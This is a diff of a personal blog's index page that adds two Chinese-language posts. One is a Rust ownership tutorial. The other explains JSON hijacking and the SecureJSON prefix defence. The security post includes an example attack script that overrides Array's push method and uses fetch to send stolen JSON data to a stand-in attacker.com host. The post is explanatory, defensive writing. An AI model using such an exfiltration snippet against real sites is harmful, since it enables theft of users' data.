@@ -185,6 +185,241 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://xudong7.github.io/2025/03/07/rust-ownership%E7%9A%84%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/favicon.ico">
+      <meta itemprop="name" content="Dunjia">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Dunjia's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/03/07/rust-ownership%E7%9A%84%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">rust-ownership的分析</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2025-03-07 10:51:28 / Modified: 11:00:35" itemprop="dateCreated datePublished" datetime="2025-03-07T10:51:28+08:00">2025-03-07</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="Rust-Ownership-的基本概念"><a href="#Rust-Ownership-的基本概念" class="headerlink" title="Rust Ownership 的基本概念"></a>Rust Ownership 的基本概念</h2><h3 id="1-什么是所有权（Ownership）？"><a href="#1-什么是所有权（Ownership）？" class="headerlink" title="1. 什么是所有权（Ownership）？"></a>1. 什么是所有权（Ownership）？</h3><p>所有权是 Rust 的核心概念之一，用于管理内存的分配和释放。在 Rust 中，每个值都有一个对应的所有者，所有者负责释放其值的内存。当所有者离开作用域时，其值将被自动释放。</p>
+<h3 id="2-所有权规则"><a href="#2-所有权规则" class="headerlink" title="2. 所有权规则"></a>2. 所有权规则</h3><p>Rust 的所有权规则如下：</p>
+<ol>
+<li>每个值都有一个对应的所有者。</li>
+<li>一个值只能有一个所有者。</li>
+<li>当所有者离开作用域时，其值将被释放。</li>
+</ol>
+<h3 id="3-所有权的优势"><a href="#3-所有权的优势" class="headerlink" title="3. 所有权的优势"></a>3. 所有权的优势</h3><p>所有权机制有以下优势：</p>
+<ul>
+<li><strong>内存安全</strong>：避免了内存泄漏和悬空指针等问题。</li>
+<li><strong>无需 GC</strong>：不需要垃圾回收器，避免了 GC 带来的性能开销。</li>
+<li><strong>并发安全</strong>：避免了数据竞争和多线程问题。</li>
+<li><strong>代码简洁</strong>：避免了手动内存管理的复杂性。</li>
+<li><strong>性能优越</strong>：避免了 GC 的停顿和内存碎片问题。</li>
+<li><strong>更好的错误检查</strong>：避免了空指针和野指针等问题。</li>
+<li><strong>更好的代码质量</strong>：避免了内存泄漏和内存溢出等问题。</li>
+<li><strong>更好的可维护性</strong>：避免了内存管理的繁琐和复杂性。</li>
+<li><strong>更好的可读性</strong>：避免了手动内存管理的细节和陷阱。</li>
+</ul>
+<h2 id="示例分析"><a href="#示例分析" class="headerlink" title="示例分析"></a>示例分析</h2><h3 id="1-所有权的转移"><a href="#1-所有权的转移" class="headerlink" title="1. 所有权的转移"></a>1. 所有权的转移</h3><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">s1</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">s2</span> = s1; <span class="comment">// s1 ownership is moved to s2</span></span><br><span class="line">    <span class="comment">// println!(&quot;&#123;&#125;&quot;, s1); // error: ownership of s1 is moved to s2</span></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, s2); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在这个示例中，<code>s1</code> 的所有权被转移到 <code>s2</code>，因此 <code>s1</code> 无法再使用。这是因为 Rust 不允许多个所有者同时拥有同一个值，以避免出现悬空指针和内存泄漏等问题。</p>
+<h3 id="2-所有权的借用"><a href="#2-所有权的借用" class="headerlink" title="2. 所有权的借用"></a>2. 所有权的借用</h3><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;Hello, world!&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">y</span> = &amp;x;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;x: &#123;&#125;&quot;</span>, x); <span class="comment">// x is still valid because it is not moved but borrowed</span></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;y: &#123;&#125;&quot;</span>, y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在这个示例中，<code>y</code> 借用了 <code>x</code> 的所有权，但并没有转移。因此 <code>x</code> 仍然有效，可以继续使用。这种方式避免了所有权的转移，同时允许多个引用同时访问同一个值。</p>
+<h3 id="3-所有权的引用"><a href="#3-所有权的引用" class="headerlink" title="3. 所有权的引用"></a>3. 所有权的引用</h3><h4 id="3-1-不可变引用"><a href="#3-1-不可变引用" class="headerlink" title="3.1 不可变引用"></a>3.1 不可变引用</h4><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">a</span> = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">b</span> = &amp;a;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;The value of a is: &#123;&#125;&quot;</span>, a);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;The value of b is: &#123;&#125;&quot;</span>, b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在这个示例中，<code>b</code> 是 <code>a</code> 的不可变引用，因此 <code>a</code> 仍然有效，可以继续使用。不可变引用的特点是：</p>
+<ul>
+<li>可以有多个不可变引用。</li>
+<li>不可变引用使用期间，原变量可继续使用。</li>
+<li>不可变引用使用后，原变量可继续使用。</li>
+</ul>
+<h4 id="3-2-可变引用"><a href="#3-2-可变引用" class="headerlink" title="3.2 可变引用"></a>3.2 可变引用</h4><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="comment">// when mut reference is used</span></span><br><span class="line">    <span class="comment">// original variable is borrowed</span></span><br><span class="line">    <span class="comment">// only one mutable reference is allowed</span></span><br><span class="line">    <span class="comment">// and only when the borrowed variable is not used</span></span><br><span class="line">    <span class="comment">// we can then use the original variable</span></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">a</span> = <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">b</span> = &amp;<span class="keyword">mut</span> a;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// println!(&quot;The value of a is: &#123;&#125;&quot;, a);  // error: a cannot be used while b is borrowed</span></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;The value of b is: &#123;&#125;&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">    *b += <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;The value of a is: &#123;&#125;&quot;</span>, a); <span class="comment">// now a can be used</span></span><br><span class="line">    <span class="comment">// println!(&quot;The value of b is: &#123;&#125;&quot;, b); // if this line is uncommented, it will throw an error</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在这个示例中，<code>b</code> 是 <code>a</code> 的可变引用，因此 <code>a</code> 在 <code>b</code> 使用期间不可使用。只有当 <code>b</code> 使用完毕后，<code>a</code> 才能继续使用。</p>
+<p>可变引用的使用规则如下：</p>
+<ul>
+<li>只能有一个可变引用。</li>
+<li>可变引用使用期间，原变量不可使用。</li>
+<li>可变引用使用后，原变量可继续使用。</li>
+</ul>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Rust 让人省心…</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://xudong7.github.io/2025/03/04/SecureJSON-%E9%98%B2%E8%8C%83JSON%E5%8A%AB%E6%8C%81/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/favicon.ico">
+      <meta itemprop="name" content="Dunjia">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Dunjia's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/03/04/SecureJSON-%E9%98%B2%E8%8C%83JSON%E5%8A%AB%E6%8C%81/" class="post-title-link" itemprop="url">SecureJSON-防范JSON劫持</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2025-03-04 20:31:13 / Modified: 20:32:50" itemprop="dateCreated datePublished" datetime="2025-03-04T20:31:13+08:00">2025-03-04</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="一、先理解基本概念"><a href="#一、先理解基本概念" class="headerlink" title="一、先理解基本概念"></a><strong>一、先理解基本概念</strong></h3><ol>
+<li><p><strong>同源策略（Same-Origin Policy）</strong><br>浏览器的一个核心安全机制，限制不同源的脚本互相访问数据。  </p>
+<ul>
+<li><strong>“同源”定义</strong>：协议、域名、端口完全一致。</li>
+<li><strong>作用</strong>：防止恶意网站通过脚本窃取其他网站的数据（如 Cookie、敏感信息）。</li>
+</ul>
+</li>
+<li><p><strong>JSON 劫持（JSON Hijacking）</strong><br>一种攻击手段，攻击者通过恶意脚本窃取网站返回的 JSON 数据。  </p>
+<ul>
+<li><strong>常见场景</strong>：JSON 数据通过 <code>&lt;script&gt;</code> 标签加载（跨域请求），且返回的是<strong>数组格式</strong>（如 <code>[&#123;&quot;id&quot;: 1&#125;]</code>）。</li>
+<li><strong>攻击原理</strong>：利用浏览器特性（如覆盖 JavaScript 内置对象的原型方法），在数据加载时窃取内容。</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h3 id="二、JSON-劫持如何绕过同源策略？"><a href="#二、JSON-劫持如何绕过同源策略？" class="headerlink" title="二、JSON 劫持如何绕过同源策略？"></a><strong>二、JSON 劫持如何绕过同源策略？</strong></h3><p>虽然同源策略限制了跨域脚本直接读取响应内容，但以下方式可能被利用：</p>
+<ol>
+<li><p><strong><code>&lt;script&gt;</code> 标签的跨域特性</strong><br>浏览器允许通过 <code>&lt;script src=&quot;...&quot;&gt;</code> 加载跨域脚本，但默认无法直接读取响应内容。</p>
+</li>
+<li><p><strong>覆盖 JavaScript 内置对象</strong><br>攻击者可以覆盖 <code>Array</code> 构造函数或 <code>Object.defineProperty</code>，在 JSON 数据解析时触发恶意代码。  </p>
+<ul>
+<li><strong>示例</strong>：  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="comment">// 恶意网站覆盖 Array 构造函数</span></span><br><span class="line">  <span class="keyword">var</span> originalArray = <span class="title class_">Array</span>;</span><br><span class="line">  <span class="title class_">Array</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="title function_">originalArray</span>();</span><br><span class="line">    arr.<span class="property">push</span> = <span class="keyword">function</span>(<span class="params">value</span>) &#123;</span><br><span class="line">      <span class="comment">// 窃取数据并发送到攻击者服务器</span></span><br><span class="line">      <span class="title function_">fetch</span>(<span class="string">&#x27;https://attacker.com?data=&#x27;</span> + value);</span><br><span class="line">      <span class="keyword">return</span> originalArray.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">push</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>, value);</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">  &#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;!-- 加载目标网站的 <span class="title class_">JSON</span> 数据 --&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://victim.com/data.json&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></li>
+<li>如果 <code>data.json</code> 返回 <code>[&#123;&quot;id&quot;: 1&#125;]</code>，浏览器会将其解析为数组，触发被覆盖的 <code>Array</code> 构造函数，导致数据泄露。</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h3 id="三、SecureJSON-如何防御-JSON-劫持？"><a href="#三、SecureJSON-如何防御-JSON-劫持？" class="headerlink" title="三、SecureJSON 如何防御 JSON 劫持？"></a><strong>三、SecureJSON 如何防御 JSON 劫持？</strong></h3><p>SecureJSON 的核心思想是<strong>破坏 JSON 数据的直接解析</strong>，使其无法被攻击者利用。以下是具体手段：</p>
+<h4 id="1-添加无害前缀"><a href="#1-添加无害前缀" class="headerlink" title="1. 添加无害前缀"></a>1. <strong>添加无害前缀</strong></h4><p>   服务器在返回 JSON 数据前，添加一段无法被 JavaScript 直接解析的前缀。  </p>
+<ul>
+<li><strong>示例</strong>：  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">)]&#125;<span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#123;&quot;id&quot;: 1&#125;</span></span><br></pre></td></tr></table></figure></li>
+<li><strong>作用</strong>：当浏览器通过 <code>&lt;script&gt;</code> 标签加载此数据时，前缀会导致语法错误，阻止后续脚本执行。</li>
+</ul>
+<h4 id="2-强制非数组格式"><a href="#2-强制非数组格式" class="headerlink" title="2. 强制非数组格式"></a>2. <strong>强制非数组格式</strong></h4><p>   将 JSON 数据包装为非数组形式（如对象），避免触发 <code>Array</code> 构造函数。  </p>
+<ul>
+<li><strong>示例</strong>：  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;data&quot;</span>: [&#123;<span class="string">&quot;id&quot;</span>: <span class="number">1</span>&#125;]&#125;</span><br></pre></td></tr></table></figure></li>
+<li><strong>作用</strong>：攻击者需要访问 <code>data</code> 属性才能获取数组，而由于同源策略限制，跨域脚本无法直接读取对象的属性。</li>
+</ul>
+<h4 id="3-结合内容类型（Content-Type）"><a href="#3-结合内容类型（Content-Type）" class="headerlink" title="3. 结合内容类型（Content-Type）"></a>3. <strong>结合内容类型（Content-Type）</strong></h4><p>   服务器设置响应头 <code>Content-Type: application/json</code>，明确告知浏览器这是 JSON 数据（而非可执行的 JavaScript）。  </p>
+<ul>
+<li><strong>现代浏览器</strong>：会拒绝通过 <code>&lt;script&gt;</code> 标签执行非 <code>application/javascript</code> 类型的内容。</li>
+</ul>
+<hr>
+<h3 id="四、SecureJSON-防御流程"><a href="#四、SecureJSON-防御流程" class="headerlink" title="四、SecureJSON 防御流程"></a><strong>四、SecureJSON 防御流程</strong></h3><ol>
+<li><p><strong>攻击者尝试通过 <code>&lt;script&gt;</code> 加载 JSON 数据</strong>  </p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://victim.com/data.json&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>服务器返回 SecureJSON 格式数据</strong>  </p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">)]&#125;<span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#123;&quot;data&quot;: [&#123;&quot;id&quot;: 1&#125;]&#125;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>浏览器解析失败</strong>  </p>
+<ul>
+<li>前缀 <code>)]&#125;&#39;</code> 导致语法错误，后续数据无法执行。</li>
+<li>即使攻击者尝试覆盖内置对象，也无法触发恶意代码。</li>
+</ul>
+</li>
+<li><p><strong>合法前端代码处理 SecureJSON</strong>  </p>
+<ul>
+<li>前端需要手动移除前缀并解析 JSON：  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;https://victim.com/data.json&#x27;</span>)</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">text</span>())</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function"><span class="params">text</span> =&gt;</span> <span class="title class_">JSON</span>.<span class="title function_">parse</span>(text.<span class="title function_">replace</span>(<span class="regexp">/^\)\]\&#125;&#x27;/</span>, <span class="string">&#x27;&#x27;</span>)));</span><br></pre></td></tr></table></figure></li>
+<li><strong>关键点</strong>：只有合法前端知道如何处理 SecureJSON 格式，攻击者无法利用自动解析机制。</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h3 id="五、同源策略的补充作用"><a href="#五、同源策略的补充作用" class="headerlink" title="五、同源策略的补充作用"></a><strong>五、同源策略的补充作用</strong></h3><ul>
+<li><strong>限制跨域数据读取</strong>：即使攻击者绕过 SecureJSON，同源策略仍会阻止恶意脚本直接读取响应内容。</li>
+<li><strong>CORS（跨域资源共享）</strong>：现代浏览器通过 CORS 进一步限制跨域请求，要求服务器显式允许跨域访问。</li>
+</ul>
+<hr>
+<h3 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a><strong>六、总结</strong></h3><p>SecureJSON 通过以下方式防止 JSON 劫持：</p>
+<ol>
+<li><strong>破坏直接解析</strong>：添加前缀或包装数据，使恶意脚本无法自动触发解析。</li>
+<li><strong>依赖同源策略</strong>：结合浏览器安全机制，阻止跨域脚本读取数据。</li>
+<li><strong>强制合法前端处理</strong>：只有已知的前端代码能正确处理 SecureJSON 格式。</li>
+</ol>
+<p>这种方法在兼容旧浏览器的同时，有效防御了 JSON 劫持攻击，是 Web 安全中一种经典的“无害化”设计思路。</p>
+<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a><strong>参考链接</strong></h3><p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/2669690/why-does-google-prepend-while1-to-their-json-responses#:~:text=In%20the%20most%20simple%20terms,key%20will%20be%20consistently%20dismissed">Why does Google prepend while(1); to their JSON responses?</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="https://xudong7.github.io/2025/03/04/gorm-mysql%E6%95%B0%E7%BB%84%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%A4%84%E7%90%86%E6%96%B9%E6%B3%95/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -897,7 +1132,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">7</span>
+          <span class="site-state-item-count">9</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
